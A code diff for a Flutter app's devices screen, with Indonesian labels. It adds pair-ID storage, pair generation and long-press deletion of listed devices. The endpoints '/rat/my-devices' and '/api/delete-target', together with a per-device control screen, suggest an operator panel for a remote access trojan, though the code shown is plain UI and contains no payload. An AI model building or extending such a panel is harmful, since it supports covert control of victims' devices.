@@ -1,6 +1,7 @@
 import 'dart:async';
 import 'package:flutter/material.dart';
 import 'package:flutter/services.dart';
+import 'package:shared_preferences/shared_preferences.dart';
 import '../theme.dart';
 import '../api.dart';
 import 'control.dart';
@@ -22,7 +23,7 @@ class _DevicesScreenState extends State<DevicesScreen> {
   @override
   void initState() {
     super.initState();
-    _load();
+    _initPairId();
     _t = Timer.periodic(const Duration(seconds: 10), (_) => _load());
   }
 
@@ -32,13 +33,34 @@ class _DevicesScreenState extends State<DevicesScreen> {
     super.dispose();
   }
 
+  Future<void> _initPairId() async {
+    final prefs = await SharedPreferences.getInstance();
+    String? localPair = prefs.getString('my_pair_id');
+
+    if (localPair == null || localPair.isEmpty) {
+      try {
+        final d = await Api.post('/api/claim-pair');
+        localPair = (d['pairId'] ?? '').toString();
+        if (localPair.isNotEmpty) {
+          await prefs.setString('my_pair_id', localPair);
+        }
+      } catch (_) {}
+    }
+
+    if (!mounted) return;
+    setState(() {
+      _pair = localPair ?? '';
+    });
+    _load();
+  }
+
   Future<void> _load() async {
+    if (_pair.isEmpty) return;
     try {
-      final p = await Api.get('/rat/pairid');
-      final d = await Api.get('/rat/my-devices');
+      final d = await Api.get('/rat/my-devices?key=$_pair');
+      
       if (!mounted) return;
       setState(() {
-        _pair = (p['pairId'] ?? '').toString();
         _list = List<dynamic>.from(d['devices'] ?? []);
         _err = null;
         _loading = false;
@@ -49,6 +71,64 @@ class _DevicesScreenState extends State<DevicesScreen> {
         _err = e.toString();
         _loading = false;
       });
+    }
+  }
+
+  Future<void> _genPair() async {
+    try {
+      final d = await Api.post('/api/claim-pair');
+      final newPair = (d['pairId'] ?? '').toString();
+      
+      if (newPair.isNotEmpty) {
+        final prefs = await SharedPreferences.getInstance();
+        await prefs.setString('my_pair_id', newPair);
+        
+        if (!mounted) return;
+        setState(() {
+          _pair = newPair;
+          _list = [];
+        });
+        _load();
+      }
+    } catch (_) {}
+  }
+
+  Future<void> _deleteDevice(String id) async {
+    final confirm = await showDialog<bool>(
+      context: context,
+      builder: (_) => AlertDialog(
+        backgroundColor: T.card,
+        title: const Text('Hapus Device?', style: TextStyle(fontFamily: T.mono, color: T.white)),
+        content: const Text('Device ini akan dihapus permanen dari panel.', style: TextStyle(color: T.dim)),
+        actions: [
+          TextButton(
+            onPressed: () => Navigator.pop(context, false),
+            child: const Text('BATAL', style: TextStyle(color: T.dim)),
+          ),
+          TextButton(
+            onPressed: () => Navigator.pop(context, true),
+            child: const Text('HAPUS', style: TextStyle(color: T.red)),
+          ),
+        ],
+      ),
+    );
+
+    if (confirm != true) return;
+
+    try {
+      await Api.delete('/api/delete-target/$id');
+      _load();
+      if (mounted) {
+        ScaffoldMessenger.of(context).showSnackBar(
+          const SnackBar(content: Text('Device berhasil dihapus')),
+        );
+      }
+    } catch (e) {
+      if (mounted) {
+        ScaffoldMessenger.of(context).showSnackBar(
+          SnackBar(content: Text('Gagal hapus: $e')),
+        );
+      }
     }
   }
 
@@ -63,21 +143,21 @@ class _DevicesScreenState extends State<DevicesScreen> {
   int get _online => _list.where((d) => d['online'] == true).length;
 
   Widget _pairBox() {
-    return GestureDetector(
-      onTap: _copyPair,
-      child: Container(
-        margin: const EdgeInsets.fromLTRB(16, 14, 16, 0),
-        padding: const EdgeInsets.all(16),
-        decoration: BoxDecoration(
-          color: T.card,
-          borderRadius: BorderRadius.circular(14),
-          border: Border.all(color: T.red.withOpacity(0.4), width: 1.4),
-        ),
-        child: Row(
-          children: [
-            const Icon(Icons.link_rounded, color: T.red, size: 22),
-            const SizedBox(width: 14),
-            Expanded(
+    return Container(
+      margin: const EdgeInsets.fromLTRB(16, 14, 16, 0),
+      padding: const EdgeInsets.all(16),
+      decoration: BoxDecoration(
+        color: T.card,
+        borderRadius: BorderRadius.circular(14),
+        border: Border.all(color: T.red.withOpacity(0.4), width: 1.4),
+      ),
+      child: Row(
+        children: [
+          const Icon(Icons.link_rounded, color: T.red, size: 22),
+          const SizedBox(width: 14),
+          Expanded(
+            child: GestureDetector(
+              onTap: _copyPair,
               child: Column(
                 crossAxisAlignment: CrossAxisAlignment.start,
                 children: [
@@ -105,9 +185,19 @@ class _DevicesScreenState extends State<DevicesScreen> {
                 ],
               ),
             ),
-            const Icon(Icons.copy_rounded, color: T.red, size: 18),
-          ],
-        ),
+          ),
+          GestureDetector(
+            onTap: _genPair,
+            child: Container(
+              padding: const EdgeInsets.all(8),
+              decoration: BoxDecoration(
+                color: T.red.withOpacity(0.2),
+                borderRadius: BorderRadius.circular(8),
+              ),
+              child: const Icon(Icons.add_rounded, color: T.red, size: 20),
+            ),
+          ),
+        ],
       ),
     );
   }
@@ -115,6 +205,7 @@ class _DevicesScreenState extends State<DevicesScreen> {
   Widget _card(dynamic d) {
     final on = d['online'] == true;
     final c = on ? T.red : T.faint;
+    final id = d['id']?.toString() ?? '';
 
     return GestureDetector(
       onTap: () => Navigator.push(
@@ -123,6 +214,7 @@ class _DevicesScreenState extends State<DevicesScreen> {
           builder: (_) => ControlScreen(device: Map<String, dynamic>.from(d)),
         ),
       ),
+      onLongPress: () => _deleteDevice(id),
       child: Container(
         padding: const EdgeInsets.all(10),
         decoration: BoxDecoration(
@@ -172,7 +264,7 @@ class _DevicesScreenState extends State<DevicesScreen> {
             ),
             const SizedBox(height: 2),
             Text(
-              d['id'] ?? '-',
+              id,
               maxLines: 1,
               overflow: TextOverflow.ellipsis,
               style: const TextStyle(
